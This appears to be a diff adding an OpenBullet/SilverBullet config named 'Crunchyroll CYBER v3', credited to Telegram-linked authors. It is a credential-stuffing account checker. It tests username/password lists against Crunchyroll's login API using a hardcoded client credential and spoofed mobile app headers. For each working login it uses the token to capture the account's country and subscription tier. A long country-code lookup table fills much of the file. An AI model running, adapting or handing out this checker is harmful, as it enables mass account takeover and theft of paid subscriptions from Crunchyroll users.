@@ -1,0 +1,455 @@
+[SETTINGS]
+{
+  "Name": "Crunchyroll CYBER v3",
+  "SuggestedBots": 120,
+  "MaxCPM": 0,
+  "LastModified": "2025-02-05T22:29:45.0942646+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "CYBERCLOUD",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "https://t.me/Cyecloud",
+      "VariableName": "",
+      "Id": 1439642589
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Crunchyroll CYBER v2",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#WeloCracking FUNCTION GenerateGUID -> VAR "DID" 
+
+#WeloCracking FUNCTION ToUppercase "<DID>" -> VAR "DID" 
+
+REQUEST POST "https://beta-api.crunchyroll.com/auth/v1/token" 
+  CONTENT "device_id=09313DAA-FD60-476F-BE6C-DCE586A53BB4&device_name=iPhone&device_type=iPhone%2014%20Pro&grant_type=password&password=<PASS>&scope=offline_access&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "host: www.crunchyroll.com" 
+  HEADER "authorization: Basic ZG1yeWZlc2NkYm90dWJldW56NXo6NU45aThPV2cyVmtNcm1oekNfNUNXekRLOG55SXo0QU0=" 
+  HEADER "x-datadog-sampling-priority: 0" 
+  HEADER "etp-anonymous-id: 65dc98df-e90d-4f60-a5af-68042af07754" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "content-length: 199" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "user-agent: Crunchyroll/3.74.2 Android/10 okhttp/4.12.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid_credentials" 
+    KEY "invalid_grant" 
+  KEYCHAIN Success OR 
+    KEY "\"access_token\"" 
+
+PARSE "<SOURCE>" JSON "refresh_token" -> VAR "rftk" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "tk" 
+
+PARSE "<SOURCE>" JSON "account_id" -> VAR "id2" 
+
+REQUEST GET "https://beta-api.crunchyroll.com/accounts/v1/me" 
+  
+  HEADER "Host: beta-api.crunchyroll.com" 
+  HEADER "authorization: Bearer <tk>" 
+  HEADER "etp-anonymous-id: 80de41e3-7f84-47e6-9f6a-b611138613ed" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "if-modified-since: Sun, 14 Apr 2024 17:28:31 GMT" 
+  HEADER "user-agent: Crunchyroll/3.54.0-s Android/9 okhttp/4.12.0" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "406" 
+    KEY "406 Not Acceptable" 
+
+PARSE "<SOURCE>" JSON "external_id" -> VAR "id" 
+
+REQUEST GET "https://beta-api.crunchyroll.com/subs/v1/subscriptions/<id>/benefits" 
+  
+  HEADER "Host: beta-api.crunchyroll.com" 
+  HEADER "authorization: Bearer <tk>" 
+  HEADER "etp-anonymous-id: 80de41e3-7f84-47e6-9f6a-b611138613ed" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "cookie: " 
+  HEADER "user-agent: Crunchyroll/3.54.0-s Android/9 okhttp/4.12.0" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "subscription.not_found" 
+    KEY "Subscription Not Found" 
+    KEY "<SOURCE>" DoesNotContain "\"subscription_country\":\"" 
+    KEY "total\":0,\"" 
+  KEYCHAIN Success AND 
+    KEY "<SOURCE>" DoesNotContain "subscription.not_found\"" 
+    KEY "\"subscription_country\":\"" 
+    KEY "<SOURCE>" DoesNotContain "total\":0,\"" 
+
+PARSE "<SOURCE>" LR "\"subscription_country\":\"" "\",\"" -> VAR "c" 
+
+FUNCTION Translate 
+  KEY "AF" VALUE "Afghanistan 🇦🇫" 
+  KEY "AX" VALUE "Åland Islands 🇦🇽" 
+  KEY "AL" VALUE "Albania 🇦🇱" 
+  KEY "DZ" VALUE "Algeria 🇩🇿" 
+  KEY "AS" VALUE "American Samoa 🇦🇸" 
+  KEY "AD" VALUE "Andorra 🇦🇩" 
+  KEY "AO" VALUE "Angola 🇦🇴" 
+  KEY "AI" VALUE "Anguilla 🇦🇮" 
+  KEY "AQ" VALUE "Antarctica 🇦🇶" 
+  KEY "AG" VALUE "Antigua and Barbuda 🇦🇬" 
+  KEY "AR" VALUE "Argentina 🇦🇷" 
+  KEY "AM" VALUE "Armenia 🇦🇲" 
+  KEY "AW" VALUE "Aruba 🇦🇼" 
+  KEY "AU" VALUE "Australia 🇦🇺" 
+  KEY "AT" VALUE "Austria 🇦🇹" 
+  KEY "AZ" VALUE "Azerbaijan 🇦🇿" 
+  KEY "BS" VALUE "Bahamas 🇧🇸" 
+  KEY "BH" VALUE "Bahrain 🇧🇭" 
+  KEY "BD" VALUE "Bangladesh 🇧🇩" 
+  KEY "BB" VALUE "Barbados 🇧🇧" 
+  KEY "BY" VALUE "Belarus 🇧🇾" 
+  KEY "BE" VALUE "Belgium 🇧🇪" 
+  KEY "BZ" VALUE "Belize 🇧🇿" 
+  KEY "BJ" VALUE "Benin 🇧🇯" 
+  KEY "BM" VALUE "Bermuda 🇧🇲" 
+  KEY "BT" VALUE "Bhutan 🇧🇹" 
+  KEY "BO" VALUE "Bolivia, Plurinational State of 🇧🇴" 
+  KEY "BQ" VALUE "Bonaire, Sint Eustatius and Saba 🇧🇶" 
+  KEY "BA" VALUE "Bosnia and Herzegovina 🇧🇦" 
+  KEY "BW" VALUE "Botswana 🇧🇼" 
+  KEY "BV" VALUE "Bouvet Island 🇧🇻" 
+  KEY "BR" VALUE "Brazil 🇧🇷" 
+  KEY "IO" VALUE "British Indian Ocean Territory 🇮🇴" 
+  KEY "BN" VALUE "Brunei Darussalam 🇧🇳" 
+  KEY "BG" VALUE "Bulgaria 🇧🇬" 
+  KEY "BF" VALUE "Burkina Faso 🇧🇫" 
+  KEY "BI" VALUE "Burundi 🇧🇮" 
+  KEY "KH" VALUE "Cambodia 🇰🇭" 
+  KEY "CM" VALUE "Cameroon 🇨🇲" 
+  KEY "CA" VALUE "Canada 🇨🇦" 
+  KEY "CV" VALUE "Cape Verde 🇨🇻" 
+  KEY "KY" VALUE "Cayman Islands 🇰🇾" 
+  KEY "CF" VALUE "Central African Republic 🇨🇫" 
+  KEY "TD" VALUE "Chad 🇹🇩" 
+  KEY "CL" VALUE "Chile 🇨🇱" 
+  KEY "CN" VALUE "China 🇨🇳" 
+  KEY "CX" VALUE "Christmas Island 🇨🇽" 
+  KEY "CC" VALUE "Cocos (Keeling) Islands 🇨🇨" 
+  KEY "CO" VALUE "Colombia 🇨🇴" 
+  KEY "KM" VALUE "Comoros 🇰🇲" 
+  KEY "CG" VALUE "Congo 🇨🇬" 
+  KEY "CD" VALUE "Congo, the Democratic Republic of the 🇨🇩" 
+  KEY "CK" VALUE "Cook Islands 🇨🇰" 
+  KEY "CR" VALUE "Costa Rica 🇨🇷" 
+  KEY "CI" VALUE "Côte d'Ivoire 🇨🇮" 
+  KEY "HR" VALUE "Croatia 🇭🇷" 
+  KEY "CU" VALUE "Cuba 🇨🇺" 
+  KEY "CW" VALUE "Curaçao 🇨🇼" 
+  KEY "CY" VALUE "Cyprus 🇨🇾" 
+  KEY "CZ" VALUE "Czech Republic 🇨🇿" 
+  KEY "DK" VALUE "Denmark 🇩🇰" 
+  KEY "DJ" VALUE "Djibouti 🇩🇯" 
+  KEY "DM" VALUE "Dominica 🇩🇲" 
+  KEY "DO" VALUE "Dominican Republic 🇩🇴" 
+  KEY "EC" VALUE "Ecuador 🇪🇨" 
+  KEY "EG" VALUE "Egypt 🇪🇬" 
+  KEY "SV" VALUE "El Salvador 🇸🇻" 
+  KEY "GQ" VALUE "Equatorial Guinea 🇬🇶" 
+  KEY "ER" VALUE "Eritrea 🇪🇷" 
+  KEY "EE" VALUE "Estonia 🇪🇪" 
+  KEY "ET" VALUE "Ethiopia 🇪🇹" 
+  KEY "FK" VALUE "Falkland Islands (Malvinas) 🇫🇰" 
+  KEY "FO" VALUE "Faroe Islands 🇫🇴" 
+  KEY "FJ" VALUE "Fiji 🇫🇯" 
+  KEY "FI" VALUE "Finland 🇫🇮" 
+  KEY "FR" VALUE "France 🇫🇷" 
+  KEY "GF" VALUE "French Guiana 🇬🇫" 
+  KEY "PF" VALUE "French Polynesia 🇵🇫" 
+  KEY "TF" VALUE "French Southern Territories 🇹🇫" 
+  KEY "GA" VALUE "Gabon 🇬🇦" 
+  KEY "GM" VALUE "Gambia 🇬🇲" 
+  KEY "GE" VALUE "Georgia 🇬🇪" 
+  KEY "DE" VALUE "Germany 🇩🇪" 
+  KEY "GH" VALUE "Ghana 🇬🇭" 
+  KEY "GI" VALUE "Gibraltar 🇬🇮" 
+  KEY "GR" VALUE "Greece 🇬🇷" 
+  KEY "GL" VALUE "Greenland 🇬🇱" 
+  KEY "GD" VALUE "Grenada 🇬🇩" 
+  KEY "GP" VALUE "Guadeloupe 🇬🇵" 
+  KEY "GU" VALUE "Guam 🇬🇺" 
+  KEY "GT" VALUE "Guatemala 🇬🇹" 
+  KEY "GG" VALUE "Guernsey 🇬🇬" 
+  KEY "GN" VALUE "Guinea 🇬🇳" 
+  KEY "GW" VALUE "Guinea-Bissau 🇬🇼" 
+  KEY "GY" VALUE "Guyana 🇬🇾" 
+  KEY "HT" VALUE "Haiti 🇭🇹" 
+  KEY "HM" VALUE "Heard Island and McDonald Islands 🇭🇲" 
+  KEY "VA" VALUE "Holy See (Vatican City State) 🇻🇦" 
+  KEY "HN" VALUE "Honduras 🇭🇳" 
+  KEY "HK" VALUE "Hong Kong 🇭🇰" 
+  KEY "HU" VALUE "Hungary 🇭🇺" 
+  KEY "IS" VALUE "Iceland 🇮🇸" 
+  KEY "IN" VALUE "India 🇮🇳" 
+  KEY "ID" VALUE "Indonesia 🇮🇩" 
+  KEY "IR" VALUE "Iran, Islamic Republic of 🇮🇷" 
+  KEY "IQ" VALUE "Iraq 🇮🇶" 
+  KEY "IE" VALUE "Ireland 🇮🇪" 
+  KEY "IM" VALUE "Isle of Man 🇮🇲" 
+  KEY "IL" VALUE "Israel 🇮🇱" 
+  KEY "IT" VALUE "Italy 🇮🇹" 
+  KEY "JM" VALUE "Jamaica 🇯🇲" 
+  KEY "JP" VALUE "Japan 🇯🇵" 
+  KEY "JE" VALUE "Jersey 🇯🇪" 
+  KEY "JO" VALUE "Jordan 🇯🇴" 
+  KEY "KZ" VALUE "Kazakhstan 🇰🇿" 
+  KEY "KE" VALUE "Kenya 🇰🇪" 
+  KEY "KI" VALUE "Kiribati 🇰🇮" 
+  KEY "KP" VALUE "Korea, Democratic People's Republic of 🇰🇵" 
+  KEY "KR" VALUE "Korea, Republic of 🇰🇷" 
+  KEY "KW" VALUE "Kuwait 🇰🇼" 
+  KEY "KG" VALUE "Kyrgyzstan 🇰🇬" 
+  KEY "LA" VALUE "Lao People's Democratic Republic 🇱🇦" 
+  KEY "LV" VALUE "Latvia 🇱🇻" 
+  KEY "LB" VALUE "Lebanon 🇱🇧" 
+  KEY "LS" VALUE "Lesotho 🇱🇸" 
+  KEY "LR" VALUE "Liberia 🇱🇷" 
+  KEY "LY" VALUE "Libya 🇱🇾" 
+  KEY "LI" VALUE "Liechtenstein 🇱🇮" 
+  KEY "LT" VALUE "Lithuania 🇱🇹" 
+  KEY "LU" VALUE "Luxembourg 🇱🇺" 
+  KEY "MO" VALUE "Macao 🇲🇴" 
+  KEY "MK" VALUE "Macedonia, the Former Yugoslav Republic of 🇲🇰" 
+  KEY "MG" VALUE "Madagascar 🇲🇬" 
+  KEY "MW" VALUE "Malawi 🇲🇼" 
+  KEY "MY" VALUE "Malaysia 🇲🇾" 
+  KEY "MV" VALUE "Maldives 🇲🇻" 
+  KEY "ML" VALUE "Mali 🇲🇱" 
+  KEY "MT" VALUE "Malta 🇲🇹" 
+  KEY "MH" VALUE "Marshall Islands 🇲🇭" 
+  KEY "MQ" VALUE "Martinique 🇲🇶" 
+  KEY "MR" VALUE "Mauritania 🇲🇷" 
+  KEY "MU" VALUE "Mauritius 🇲🇺" 
+  KEY "YT" VALUE "Mayotte 🇾🇹" 
+  KEY "MX" VALUE "Mexico 🇲🇽" 
+  KEY "FM" VALUE "Micronesia, Federated States of 🇫🇲" 
+  KEY "MD" VALUE "Moldova, Republic of 🇲🇩" 
+  KEY "MC" VALUE "Monaco 🇲🇨" 
+  KEY "MN" VALUE "Mongolia 🇲🇳" 
+  KEY "ME" VALUE "Montenegro 🇲🇪" 
+  KEY "MS" VALUE "Montserrat 🇲🇸" 
+  KEY "MA" VALUE "Morocco 🇲🇦" 
+  KEY "MZ" VALUE "Mozambique 🇲🇿" 
+  KEY "MM" VALUE "Myanmar 🇲🇲" 
+  KEY "NA" VALUE "Namibia 🇳🇦" 
+  KEY "NR" VALUE "Nauru 🇳🇷" 
+  KEY "NP" VALUE "Nepal 🇳🇵" 
+  KEY "NL" VALUE "Netherlands 🇳🇱" 
+  KEY "NC" VALUE "New Caledonia 🇳🇨" 
+  KEY "NZ" VALUE "New Zealand 🇳🇿" 
+  KEY "NI" VALUE "Nicaragua 🇳🇮" 
+  KEY "NE" VALUE "Niger 🇳🇪" 
+  KEY "NG" VALUE "Nigeria 🇳🇬" 
+  KEY "NU" VALUE "Niue 🇳🇺" 
+  KEY "NF" VALUE "Norfolk Island 🇳🇫" 
+  KEY "MP" VALUE "Northern Mariana Islands 🇲🇵" 
+  KEY "NO" VALUE "Norway 🇳🇴" 
+  KEY "OM" VALUE "Oman 🇴🇲" 
+  KEY "PK" VALUE "Pakistan 🇵🇰" 
+  KEY "PW" VALUE "Palau 🇵🇼" 
+  KEY "PS" VALUE "Palestine, State of 🇵🇸" 
+  KEY "PA" VALUE "Panama 🇵🇦" 
+  KEY "PG" VALUE "Papua New Guinea 🇵🇬" 
+  KEY "PY" VALUE "Paraguay 🇵🇾" 
+  KEY "PE" VALUE "Peru 🇵🇪" 
+  KEY "PH" VALUE "Philippines 🇵🇭" 
+  KEY "PN" VALUE "Pitcairn 🇵🇳" 
+  KEY "PL" VALUE "Poland 🇵🇱" 
+  KEY "PT" VALUE "Portugal 🇵🇹" 
+  KEY "PR" VALUE "Puerto Rico 🇵🇷" 
+  KEY "QA" VALUE "Qatar 🇶🇦" 
+  KEY "RE" VALUE "Réunion 🇷🇪" 
+  KEY "RO" VALUE "Romania 🇷🇴" 
+  KEY "RU" VALUE "Russian Federation 🇷🇺" 
+  KEY "RW" VALUE "Rwanda 🇷🇼" 
+  KEY "BL" VALUE "Saint Barthélemy 🇧🇱" 
+  KEY "SH" VALUE "Saint Helena, Ascension and Tristan da Cunha 🇸🇭" 
+  KEY "KN" VALUE "Saint Kitts and Nevis 🇰🇳" 
+  KEY "LC" VALUE "Saint Lucia 🇱🇨" 
+  KEY "MF" VALUE "Saint Martin (French part) 🇲🇫" 
+  KEY "PM" VALUE "Saint Pierre and Miquelon 🇵🇲" 
+  KEY "VC" VALUE "Saint Vincent and the Grenadines 🇻🇨" 
+  KEY "WS" VALUE "Samoa 🇼🇸" 
+  KEY "SM" VALUE "San Marino 🇸🇲" 
+  KEY "ST" VALUE "Sao Tome and Principe 🇸🇹" 
+  KEY "SA" VALUE "Saudi Arabia 🇸🇦" 
+  KEY "SN" VALUE "Senegal 🇸🇳" 
+  KEY "RS" VALUE "Serbia 🇷🇸" 
+  KEY "SC" VALUE "Seychelles 🇸🇨" 
+  KEY "SL" VALUE "Sierra Leone 🇸🇱" 
+  KEY "SG" VALUE "Singapore 🇸🇬" 
+  KEY "SX" VALUE "Sint Maarten (Dutch part) 🇸🇽" 
+  KEY "SK" VALUE "Slovakia 🇸🇰" 
+  KEY "SI" VALUE "Slovenia 🇸🇮" 
+  KEY "SB" VALUE "Solomon Islands 🇸🇧" 
+  KEY "SO" VALUE "Somalia 🇸🇴" 
+  KEY "ZA" VALUE "South Africa 🇿🇦" 
+  KEY "GS" VALUE "South Georgia and the South Sandwich Islands 🇬🇸" 
+  KEY "SS" VALUE "South Sudan 🇸🇸" 
+  KEY "ES" VALUE "Spain 🇪🇸" 
+  KEY "LK" VALUE "Sri Lanka 🇱🇰" 
+  KEY "SD" VALUE "Sudan 🇸🇩" 
+  KEY "SR" VALUE "Suriname 🇸🇷" 
+  KEY "SJ" VALUE "Svalbard and Jan Mayen 🇸🇯" 
+  KEY "SZ" VALUE "Swaziland 🇸🇿" 
+  KEY "SE" VALUE "Sweden 🇸🇪" 
+  KEY "CH" VALUE "Switzerland 🇨🇭" 
+  KEY "SY" VALUE "Syrian Arab Republic 🇸🇾" 
+  KEY "TW" VALUE "Taiwan, Province of China 🇹🇼" 
+  KEY "TJ" VALUE "Tajikistan 🇹🇯" 
+  KEY "TZ" VALUE "Tanzania, United Republic of 🇹🇿" 
+  KEY "TH" VALUE "Thailand 🇹🇭" 
+  KEY "TL" VALUE "Timor-Leste 🇹🇱" 
+  KEY "TG" VALUE "Togo 🇹🇬" 
+  KEY "TK" VALUE "Tokelau 🇹🇰" 
+  KEY "TO" VALUE "Tonga 🇹🇴" 
+  KEY "TT" VALUE "Trinidad and Tobago 🇹🇹" 
+  KEY "TN" VALUE "Tunisia 🇹🇳" 
+  KEY "TR" VALUE "Turkey 🇹🇷" 
+  KEY "TM" VALUE "Turkmenistan 🇹🇲" 
+  KEY "TC" VALUE "Turks and Caicos Islands 🇹🇨" 
+  KEY "TV" VALUE "Tuvalu 🇹🇻" 
+  KEY "UG" VALUE "Uganda 🇺🇬" 
+  KEY "UA" VALUE "Ukraine 🇺🇦" 
+  KEY "AE" VALUE "United Arab Emirates 🇦🇪" 
+  KEY "GB" VALUE "United Kingdom 🇬🇧" 
+  KEY "US" VALUE "United States 🇺🇸" 
+  KEY "UM" VALUE "United States Minor Outlying Islands 🇺🇲" 
+  KEY "UY" VALUE "Uruguay 🇺🇾" 
+  KEY "UZ" VALUE "Uzbekistan 🇺🇿" 
+  KEY "VU" VALUE "Vanuatu 🇻🇺" 
+  KEY "VE" VALUE "Venezuela, Bolivarian Republic of 🇻🇪" 
+  KEY "VN" VALUE "Viet Nam 🇻🇳" 
+  KEY "VG" VALUE "Virgin Islands, British 🇻🇬" 
+  KEY "VI" VALUE "Virgin Islands, U.S. 🇻🇮" 
+  KEY "WF" VALUE "Wallis and Futuna 🇼🇫" 
+  KEY "EH" VALUE "Western Sahara 🇪🇭" 
+  KEY "YE" VALUE "Yemen 🇾🇪" 
+  KEY "ZM" VALUE "Zambia 🇿🇲" 
+  KEY "ZW" VALUE "Zimbabwe 🇿🇼" 
+  "<c>" -> CAP "COUNTRY" 
+
+PARSE "<SOURCE>" LR "\"benefit\":\"concurrent_" "\"," Recursive=TRUE -> VAR "st" 
+
+PARSE "<SOURCE>" LR "\"benefit\":\"cr_store" "\",\"" -> VAR "stor" "cr_store" "" 
+
+PARSE "<SOURCE>" LR "benefit\":\"" "\",\"" Recursive=TRUE -> VAR "pl" 
+
+PARSE "<pl>" LR "cr" "," Recursive=TRUE -> VAR "pla" "cr" "" 
+
+FUNCTION Replace "cr_premium" "" "<pla>" -> VAR "pla1" 
+
+IF "<pla>" EqualTo "[cr_premium]"
+JUMP #premium
+ENDIF
+IF "<SOURCE>" CONTAINS "cr_store."
+
+FUNCTION Replace "," "" "<pla1>" -> VAR "pla2" 
+
+FUNCTION Replace "<stor>" "" "<pla2>" -> VAR "pla3" 
+
+FUNCTION Replace "[" "" "<pla3>" -> VAR "pla4" 
+
+FUNCTION Replace " " "" "<pla4>" -> VAR "pla41" 
+
+FUNCTION Replace "]" "" "<pla41>" -> VAR "pla5" 
+
+ELSE
+
+FUNCTION Replace "," "" "<pla1>" -> VAR "pla2" 
+
+FUNCTION Replace " " "" "<pla2>" -> VAR "pla3" 
+
+FUNCTION Replace "[" "" "<pla3>" -> VAR "pla4" 
+
+FUNCTION Replace "]" "" "<pla4>" -> VAR "pla5" 
+
+ENDIF
+IF "<pla>" EqualTo "[cr_premium]"
+
+#premium FUNCTION Constant "cr_premium" -> VAR "pla5" 
+
+ENDIF
+
+FUNCTION Replace " " "" "<st>" -> VAR "st" 
+
+FUNCTION CountOccurrences "streams" "<st>" -> VAR "st1" 
+
+IF "<st1>" GreaterThan "1"
+
+PARSE "<st>" LR "," "]" -> VAR "st" "[" "]" 
+
+ENDIF
+
+FUNCTION Translate 
+  KEY "[streams.4]" VALUE "MEGA FAN MEMBER" 
+  KEY "[streams.1]" VALUE "FAN MEMBER" 
+  KEY "[streams.6]" VALUE "ULTIMATE FAN MEMBER" 
+  "<st>" -> VAR "pl1" 
+
+FUNCTION Constant "⟪<pl1>⟫—[<pla5>]" -> CAP "PLAN(SUB)" 
+
+SET CAP "CONFIG BY" "@Nab_nett"
+
